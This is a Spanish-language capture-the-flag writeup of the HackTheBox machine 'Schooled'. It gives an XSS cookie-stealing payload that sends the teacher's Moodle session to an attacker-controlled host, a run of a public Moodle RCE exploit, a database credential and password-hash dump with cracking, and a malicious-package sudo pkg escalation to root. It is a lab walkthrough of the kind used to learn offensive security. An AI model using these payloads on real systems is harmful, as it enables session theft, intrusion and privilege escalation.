---
title: "Schooled - HTB Writeup"
layout: single
excerpt: "Schooled es una máquina de dificultad media de HackTheBox. En esta máquina hemos abusado de un XSS para hacer un cookie hijacking y un RCE para la intrusión inicial. Para escalar privilegios nos hemos aprovechado de un permisos de sudoers con el que se podía ejecutar pkg como usuario root.
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/133804298-d1817f22-ad27-493d-8806-9d288f901add.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - XSS
  - Cookie Hijacking
  - Pkg
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/133804394-6360198e-8b14-4ff3-a750-315dbb122873.png)

# Enumeración

Nada nuevo, comenzamos como siempre enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} con la herramienta `ping`, con esto veremos el estado de la máquina y su sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.234
PING 10.10.10.234 (10.10.10.234) 56(84) bytes of data.
64 bytes from 10.10.10.234: icmp_seq=1 ttl=63 time=67.2 ms

--- 10.10.10.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 67.204/67.204/67.204/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el TTL, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos con la fase de **enumeración de puertos**, yo en mi caso haré uso de la famosa herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.234 -sC -sV -oN targeted 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-17 16:08 WEST
Nmap scan report for 10.10.10.234
Host is up (0.066s latency).
Not shown: 59137 filtered tcp ports (no-response), 6395 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 (FreeBSD PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Schooled - A new kind of educational institute
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message
|     HY000
|   oracle-tns: 
|     Invalid message-frame.
|_    HY000
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.24 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Como vemos hay 2 puertos relevantes:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Empiezo enumerando el servicio **HTTP** con la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $whatweb http://10.10.10.234
http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15],
IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```
Como vemos nos reporta varias cosas, pero me fijo sobretodo en el **dominio del email** que es ha reportado.

No descarto que se utilice [virtual hosting](https://www.ecured.cu/Virtual_Host){:target="\_blank"}{:rel="noopener nofollow"} y añado este dominio al archivo `/etc/host`:

![image](https://user-images.githubusercontent.com/67548295/133807813-7d860c4a-8796-4fa8-8e64-8d77a7e8376a.png)

Ahora visito la web desde el navegador utilizando la **IP**:

![image](https://user-images.githubusercontent.com/67548295/133808055-357f7b05-84ce-4f54-9194-a1c3b8bffd72.png)

Por lo que veo parece ser un sitio web de un **centro educativo**.

Bien, ahora visitemos el sitio web pero utilizando el **dominio** que hemos integrado en el `/etc/hosts`:

![image](https://user-images.githubusercontent.com/67548295/133810188-717455e7-229b-4e8c-9f11-40ce92b82f27.png)

Al parecer no se está aplicando virtual hosting.

Sigo enumerando la web, haciendo **fuzzing** de directorios, intentando buscar **paneles de sesión**, pero no encuentro nada.

Es aqui cuando se me ocurre intentar buscar **subdominios** con la herramienta `gobuster`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $gobuster vhost -u "http://schooled.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://schooled.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/17 16:39:41 Starting gobuster in VHOST enumeration mode
===============================================================
Found: moodle.schooled.htb (Status: 200) [Size: 84]
```
Y encontramos un **subdominio** con nombre [Moodle](https://www.moodle.cl/que-es-el-moodle-y-para-que-sirve/){:target="\_blank"}{:rel="noopener nofollow"} 

Asi que lo añado tambien al archivo `/etc/hosts`:

![image](https://user-images.githubusercontent.com/67548295/133816618-f248de8c-aab1-4e69-8d96-542933e1ca69.png)

Visito este subdominio para ver que hay:

![image](https://user-images.githubusercontent.com/67548295/133816918-c8391d00-6112-4297-abf2-1c0d66752570.png)

Como sospechaba, es un gestor de contenidos **Moodle**

Vemos que hay varias asignaturas, voy a probar a inscribirme en la asignatura de **matemáticas**:

![image](https://user-images.githubusercontent.com/67548295/133818294-55be77ec-f3b9-4a0c-a423-28f8b160e583.png)

Pero al hacer click en el hipervínculo me redirige a un **panel de inicio de sesión**.

Como no dispongo de credenciales válidas, pruebo a **crear una cuenta**:

![image](https://user-images.githubusercontent.com/67548295/133819663-1400b9ec-87cb-4e35-8b80-832eea672ab9.png)

Una vez creada la cuenta, veo que como **única** opción de inscripción tengo la asignatura de **matemáticas**:

![image](https://user-images.githubusercontent.com/67548295/133819853-d4d2ed22-008a-47fd-b7c3-d4193d283700.png)

Me inscribo y observo que hay un **hilo de anuncios** al que puedo acceder.

Ingreso al tablón de anuncios y veo un post que me llama la atención **escrito por el profesor** de la asignatura:

![image](https://user-images.githubusercontent.com/67548295/133820401-5657fab4-c1ed-404a-808c-edce40ed8aea.png)

![image](https://user-images.githubusercontent.com/67548295/133820468-de477e6b-cdcd-40b0-83f3-7430ce72e069.png)

En español:

> Este es un curso de autoinscripción. Los estudiantes que deseen asistir a mis clases deben asegurarse de tener su perfil de MoodleNet configurado.
>
> Los estudiantes que no tengan configurado su perfil de MoodleNet serán eliminados del curso antes de que éste comience y comprobaré a todos los estudiantes que estén inscritos en este curso.
>
> Espero verlos a todos pronto.
>
> Manuel Phillips

El profesor está insistiendo en que todos los alumnos tienen que tener un **ajuste** de sus perfiles configurado, este se llama `MoodleNet`.

Me llama la atención que dice que **comprobará que todos los estudiantes tengan esto**. ¿Habrá una [tarea cron](https://www.dondominio.com/help/es/252/que-son-las-tareas-cron/){:target="\_blank"}{:rel="noopener nofollow"} que accederá a esta configuración de los alumnos? ¿Si es así, habrá alguna manera de aprovecharnos de esto para acceder al sistema o escalar privilegios?

Vayamos a la configuración de nuestro perfil para ver si encontramos este ajuste:

![image](https://user-images.githubusercontent.com/67548295/133827012-024d32c8-7531-4ee2-8465-c0340a0f6def.png)

![image](https://user-images.githubusercontent.com/67548295/133827143-a1182e1b-8ead-4627-8fbc-494ec8b979d0.png)

Ahí esta la configuración que nos pide el profesor.

Al ser un campo donde puedo meter **cualquier dato**, puedo probar a ver si es vulnerable a [XSS](https://jorgesaavedra.wordpress.com/2007/07/26/%C2%BFque-es-xss/){:target="\_blank"}{:rel="noopener nofollow"} con una simple 'string' de prueba:

![image](https://user-images.githubusercontent.com/67548295/133827596-0790ba28-39c6-46c2-94c8-207097be8328.png)

Bien, si el campo no está bien **sanitizado**, entonces me debería mostrar una **ventana emergente** con el mensaje 'test' si guardo los cambios y refresco la página.

Veamos si es vulnerable:

![image](https://user-images.githubusercontent.com/67548295/133827851-395ecc42-62c2-46d6-a053-d1502bc5daf1.png)

Y sí, es vulnerable.

Ahora, ¿Que puedo hacer con esto?

Si recordamos, el profesor dijo en su post que iba a estar **revisando** este ajuste en todos sus alumnos, si ahora mismo el profesor mira mi perfil, le estará saliendo una **ventana emergente** como a mí.

Con esto se me ocurre diseñar un **payload** especifico para **secuestrar la cookie del profesor** y poder iniciar sesión como el profesor.

Un payload como este nos serviría: `<script>location.href = 'http://LHOST:LPORT/?cookie='+document.cookie;</script>`. Reemplazando los campos con nuestra **IP local** y un **puerto**, si nos ponemos en escucha, **recibiremos la cookie del profesor**.

Probemos a hacer esto:

![image](https://user-images.githubusercontent.com/67548295/133828737-2cc8af58-4eeb-48b3-9757-b0bbf9c67125.png)

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Bien, si guardamos cambios en el perfil, en cuestión de unos minutos deberiamos recibir una petición en nuestro pequeño servidor montado con python con la cookie del profesor:

```
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [17/Sep/2021 18:23:37] "GET /?cookie=MoodleSession=vge968dmn227br8qpam1s7nt29 HTTP/1.1" 200 -
10.10.10.234 - - [17/Sep/2021 18:23:37] "GET /?cookie=MoodleSession=vge968dmn227br8qpam1s7nt29 HTTP/1.1" 200 -
```
¡Ha funcionado!

Probemos ahora a **sustituir** la cookie en el navegador y refrescar la página para ver si nos hemos convertido en el profesor:

![image](https://user-images.githubusercontent.com/67548295/133829384-08d9c88c-6f01-4d76-a458-de7152a1ed66.png)

Perfecto.

Ahora ya tenemos más **privilegios**, y podemos intentar obtener acceso a la máquina.

Buscando exploit de este gestor de contenidos encuentro uno que **otorga un rol de administrador al profesor para luego abusar de un RCE**.

Ya que no conocemos ninguna versión, lo más viable es buscar exploits acordes con nuestra situación, es decir, siendo profesor.

Pruebo el exploit hecho por [Lanzt](https://github.com/lanzt/CVE-2020-14321){:target="\_blank"}{:rel="noopener nofollow"}:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $python3 CVE-2020-14321_RCE.py http://moodle.schooled.htb/moodle/ --cookie bcqfkajge5u6d5iiinkikfbmea
 __     __     __   __  __   __              __  __     
/  \  /|_  __   _) /  \  _) /  \ __  /| |__|  _)  _) /| 
\__ \/ |__     /__ \__/ /__ \__/      |    | __) /__  | • by lanz

Moodle 3.9 - Remote Command Execution (Authenticated as teacher)
Course enrolments allowed privilege escalation from teacher role into manager role to RCE
                                                        
[+] Login on site: MoodleSession:bcqfkajge5u6d5iiinkikfbmea ✓
[+] Updating roles to move on manager accout: ✓
[+] Updating rol manager to enable install plugins: ✓
[+] Uploading malicious .zip file: ✓
[+] Executing whoami: ✓

www

[+] Keep breaking ev3rYthiNg!!
```
Vemos que nos ha ejecutado un `whoami` exitosamente.

Ahora añadamos el parámetro `-c` para que nos ejecute un comando que nosotros le especifiquemos:

![image](https://user-images.githubusercontent.com/67548295/133834556-434377f5-89cb-43e4-894a-b503afe95b52.png)

Y... ¡hemos conseguido acceso al sistema!

---

Comienzo a **enumerar** el sistema.

Enumerando en el directorio del `Moodle` encuentro un archivo `config.php`:

```
~$ cat config.php

<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlXXXXXXXXXXX20';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

El archivo contiene supuestas **credenciales** de [MySQL](https://www.hostinger.es/tutoriales/que-es-mysql){:target="\_blank"}{:rel="noopener nofollow"}.

Bien probemos a conectarnos al cliente de MySQL con las credenciales que hemos encontrado:

```bash
/usr/local/bin/mysql -u moodle -pPXXXXXXXXX0 -e "show databases;"

mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
moodle
```

Las credenciales son válidas.

Enumero la base de datos `moodle` hasta que encuentro una tabla con nombre `mdl_user` que contenía todos los **hashes** de todos los usuarios del `Moodle`:

```bash
~$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle;select firstname,password from mdl_user;'

mysql: [Warning] Using a password on the command line interface can be insecure.
firstname	password
Guest user	$2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
Jamie	$2y$10$3DXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5GFbcl4qTiW
Oliver	$2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
Sheila	$2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
Elizabeth	$2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
Jake	$2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
James	$2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
Michael	$2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
Rakesh	$2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
Marcus	$2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
Shaun	$2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
John	$2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
Jack	$2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
Carl	$2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
Amy	$2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
Boris	$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
Allan	$2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
William	$2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
Zoe	$2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
Travis	$2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
Matthew	$2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
Wallis	$2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
Jane	$2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
Manuel	$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
Lianne	$2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
Dan	$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
Tim	$2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
z3r0	$2y$10$QjyUi7WuKWD.GLgdPYLY7eyFT0IkW7exn2CAwPTofHmmB35C.C0OK
```

Enumero el archivo `/etc/passwd` en busca de **usuarios** para ver si alguno coincide con los que hemos encontrado en la base de datos:

```bash
~$ grep -E "1[0-9]{3}" /etc/passwd | awk '{print $1}' FS=':'

jamie
steve
```
Hay 2 usuarios en el sistema, `steve` no consta en la base de datos pero `jamie` sí, y tenemos su contraseña en formato **hash**.

Tras ver esto, procedo a **crackear el hash** con la herramienta `johnTheRipper`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXXX         (?)
1g 0:00:02:33 DONE (2021-09-18 16:48) 0.006506g/s 90.40p/s 90.40c/s 90.40C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Con esta contraseña ya es posible **conectarnos por SSH** a la máquina como el usuario `jamie`:

```
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ssh jamie@10.10.10.234
Password for jamie@Schooled:
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
To save disk space in your home directory, compress files you rarely
use with "gzip filename".
		-- Dru <genesis@istar.ca>
jamie@Schooled:~ $ 
```

Una vez aqui ya podremos ver la flag `user.txt` en la ruta `/home/jamie/user.txt`:

```bash
jamie@Schooled:~ $ cat /home/jamie/user.txt 
e92XXXXXXXXXXXXXXXXXXXXXXXXXXXec0
```

# Root.txt

Al hacer `sudo -l` veo que disponemos de un **permiso**:

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Podemos ejecutar `pkg update` y `pkg install *` como usuario **root**.

Si buscamos en [GTFObins](https://gtfobins.github.io/){:target="\_blank"}{:rel="noopener nofollow"} el binario `pkg` veremos que se puede **explotar** cuando nos dan permisos de ejecutarlo como root:

![image](https://user-images.githubusercontent.com/67548295/133911145-079aa1f1-a0b7-4be5-a2fe-d5b84f5f3eee.png)

Aqui hay un pequeño problema, y es que la máquina no tiene `fpm` instalado, es por esto que tendremos que hacer estos pasos **desde nuestra máquina de atacante**.

Bien, hagamos esto:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
```
He reemplazado el comando `ìd` que venía por defecto, por el comando `chmod u+s /bin/bash` que proporciona permisos [SUID](https://www.luisguillen.com/posts/2017/12/como-funcionan-permisos-suid/){:target="\_blank"}{:rel="noopener nofollow"} a `/bin/bash`.

Ahora hay que instalar `fpm` en nuestra máquina, se hace ejecutando estos 2 comandos:

> ~$ sudo apt-get install ruby ruby-dev rubygems gcc make rpm

> ~$ sudo gem install fpm

Una vez ejecutados, tendremos `fpm` instalado y ya podremos hacer el último paso:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

Created package {:path=>"x-1.0.txz"}
```
Ahora tendremos que **transferir** el paquete a la **máquina víctima**:

**Máquina atacante**
```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Máquina víctima**
```bash
jamie@Schooled:~ $ curl  http://10.10.14.13:8000/x-1.0.txz -o /tmp/malicious-package.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   504  100   504    0     0   3111      0 --:--:-- --:--:-- --:--:--  3111
jamie@Schooled:~ $ ls /tmp/malicious-package.txz
/tmp/malicious-package.txz
```

Una vez en este punto, ejecutaremos este comando para **instala** el paquete malicioso:

```bash
jamie@Schooled:/tmp $ sudo -u root /usr/sbin/pkg install -y --no-repo-update /tmp/malicious-package.txz 
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
	x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
Extracting x-1.0:   0%
pkg: File //tmp/tmp.cVxfddvCO5/x.sh not specified in the manifest
Extracting x-1.0: 100%
```
Y listo! Se supone que se debería de haber ejecutado el **comando** que introducimos en el paquete malicioso.

Para comprobarlo, ejecutemos `bash -p`, y si ha funcionado, deberíamos obtener una **shell como usuario root**:

```bash
jamie@Schooled:/tmp $ bash -p
[jamie@Schooled /tmp]# whoami
root
```
¡¡Ha funcionado!! Una vez en este punto, podremos visualizar la flag `root.txt` en la ruta `/root/root.txt`

```bash
[jamie@Schooled /tmp]# cat /root/root.txt
98aXXXXXXXXXXXXXXXXXXXXXXXXXXb39
```

# Resumen

En esta máquina hemos abusado de una vulnerabilidad de **XSS** en el gestor de contenidos `Moodle` para hacer un **cookie hijacking** al profesor, a partir de ahí, nos hemos 
aprovechado de una vulnerabilidad del **CMS** que permitía instalar plugins y a su vez provocar un **RCE**.
Para escalar privilegios hemos hecho uso de una **credencial** que hemos encontrado para reportar los **hashes** de los usuarios de la base de datos de `Moodle` para poder migrar a otro usuario del sistema.
Por último hemos 'rooteado' el sistema abusando de un **permiso de sudoers** que permitía **instalar paquetes como cualquier usuario**, creando un paquete malicioso y ejecutandolo como **root** conseguimos asignar permisos `SUID` a `/bin/bash` y rootear el sistema.
